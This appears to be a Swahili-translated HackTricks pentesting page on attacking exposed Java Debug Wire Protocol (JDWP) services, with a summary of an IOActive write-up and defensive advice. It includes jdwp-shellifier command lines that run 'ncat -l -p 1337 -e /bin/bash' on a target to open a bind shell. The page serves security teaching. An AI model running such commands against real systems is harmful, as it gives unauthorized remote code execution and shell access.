# Pentesting JDWP - Itifaki ya Uunganishaji wa Java Debug Wire

<details>

<summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako ikionekana katika HackTricks** au **kupakua HackTricks kwa muundo wa PDF** Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**swag rasmi wa PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**The PEASS Family**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) za kipekee
* **Jiunge na** üí¨ [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>

## Kudukua

Udanganyifu wa JDWP unategemea **ukosefu wa uwakilishi na kusimbwa kwa itifaki**. Kawaida inapatikana kwenye **bandari 8000**, lakini bandari nyingine ni sawa. Uunganisho wa awali unafanywa kwa kutuma "JDWP-Handshake" kwenye bandari ya lengo. Ikiwa huduma ya JDWP iko hai, itajibu na herufi sawa, ikithibitisha uwepo wake. Hatua hii ya mwanzo inafanya kazi kama njia ya kutambua huduma za JDWP kwenye mtandao.

Kuhusu utambuzi wa mchakato, kutafuta herufi "jdwk" kwenye michakato ya Java inaweza kuashiria kikao cha JDWP kilichopo.

Zana inayotumiwa ni [jdwp-shellifier](https://github.com/hugsy/jdwp-shellifier). Unaweza kuitumia na vigezo tofauti:
```bash
./jdwp-shellifier.py -t 192.168.2.9 -p 8000 #Obtain internal data
./jdwp-shellifier.py -t 192.168.2.9 -p 8000 --cmd 'ncat -l -p 1337 -e /bin/bash' #Exec something
./jdwp-shellifier.py -t 192.168.2.9 -p 8000 --break-on 'java.lang.String.indexOf' --cmd 'ncat -l -p 1337 -e /bin/bash' #Uses java.lang.String.indexOf as breakpoint instead of java.net.ServerSocket.accept
```
Nimegundua kuwa matumizi ya `--break-on 'java.lang.String.indexOf'` yanafanya shambulizi kuwa **thabiti** zaidi. Na ikiwa una nafasi ya kupakia mlango wa nyuma kwenye mwenyeji na kuutekeleza badala ya kutekeleza amri, shambulizi litakuwa thabiti zaidi.

## Maelezo zaidi

**Hii ni muhtasari wa [https://ioactive.com/hacking-java-debug-wire-protocol-or-how/](https://ioactive.com/hacking-java-debug-wire-protocol-or-how/)**. Angalia kwa maelezo zaidi.

1. **JDWP Maelezo**:
- Ni itifaki ya mtandao ya pakiti, hasa ya kusawazisha.
- Haina uthibitishaji na kificho, ikifanya kuwa hatarishi wakati inapofichuliwa kwenye mtandao wenye nia mbaya.

2. **JDWP Handshake**:
- Mchakato rahisi wa kupeana mikono hutumiwa kuanzisha mawasiliano. Kamba ya ASCII yenye herufi 14 "JDWP-Handshake" inabadilishwa kati ya Debugger (mteja) na Debuggee (seva).

3. **Mawasiliano ya JDWP**:
- Ujumbe una muundo rahisi na sehemu kama Urefu, Kitambulisho, Bendera, na Seti ya Amri.
- Thamani za Seti ya Amri zinaanzia 0x40 hadi 0x80, zikionyesha hatua na matukio tofauti.

4. **Udanganyifu**:
- JDWP inaruhusu kupakia na kuita darasa na kanuni ya kiholela, ikileta hatari za usalama.
- Makala inaelezea mchakato wa udanganyifu katika hatua tano, ikihusisha kupata marejeleo ya Java Runtime, kuweka alama za kusitisha, na kuita njia.

5. **Udanganyifu katika Maisha Halisi**:
- Licha ya ulinzi wa firewall, huduma za JDWP zinaweza kupatikana na kudanganywa katika mazingira halisi, kama inavyothibitishwa na utafutaji kwenye majukwaa kama ShodanHQ na GitHub.
- Kigezo cha udanganyifu kilijaribiwa dhidi ya toleo mbalimbali za JDK na ni huru ya jukwaa, ikitoa Utekelezaji wa Kanuni kwa Mbali (RCE) unaoweza kutegemewa.

6. **Athari za Usalama**:
- Kuwepo kwa huduma za JDWP zilizofunguliwa kwenye mtandao kunasisitiza umuhimu wa ukaguzi wa usalama mara kwa mara, kuzima utendaji wa kurekebisha katika uzalishaji, na mipangilio sahihi ya firewall.

### **Marejeo:**

* [[https://ioactive.com/hacking-java-debug-wire-protocol-or-how/](https://ioactive.com/hacking-java-debug-wire-protocol-or-how/)]
* [https://github.com/IOActive/jdwp-shellifier](https://github.com/IOActive/jdwp-shellifier)
* [http://docs.oracle.com/javase/7/docs/technotes/guides/jpda/architecture.html](http://docs.oracle.com/javase/7/docs/technotes/guides/jpda/architecture.html)
* http://www.secdev.org/projects/scapy(no longer active)
* [http://www.shodanhq.com/search?q=JDWP-HANDSHAKE](http://www.shodanhq.com/search?q=JDWP-HANDSHAKE)
* http://www.hsc-news.com/archives/2013/000109.html (no longer active)
* [http://packetstormsecurity.com/files/download/122525/JDWP-exploitation.txt](http://packetstormsecurity.com/files/download/122525/JDWP-exploitation.txt)
* https://github.com/search?q=-Xdebug+-Xrunjdwp\&type=Code\&ref=searchresults
* [http://docs.oracle.com/javase/6/docs/api/java/lang/Runtime.html](http://docs.oracle.com/javase/6/docs/api/java/lang/Runtime.html)
* [http://docs.oracle.com/javase/1.5.0/docs/guide/jpda/jdwp-spec.html](http://docs.oracle.com)
* [http://docs.oracle.com/javase/1.5.0/docs/guide/jpda/jdwp/jdwp-protocol.html](http://docs.oracle.com/javase/1.5.0/docs/guide/jpda/jdwp/jdwp-protocol.html)
* [http://nmap.org/nsedoc/scripts/jdwp-exec.html](http://nmap.org/nsedoc/scripts/jdwp-exec.html)

<details>

<summary><strong>Jifunze kuhusu udukuzi wa AWS kutoka sifuri hadi bingwa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako inatangazwa kwenye HackTricks** au **kupakua HackTricks kwa muundo wa PDF** Angalia [**MIPANGO YA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**swag rasmi wa PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**The PEASS Family**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) za kipekee
* **Jiunge na** üí¨ [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au **kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Shiriki mbinu zako za udukuzi kwa kuwasilisha PR kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
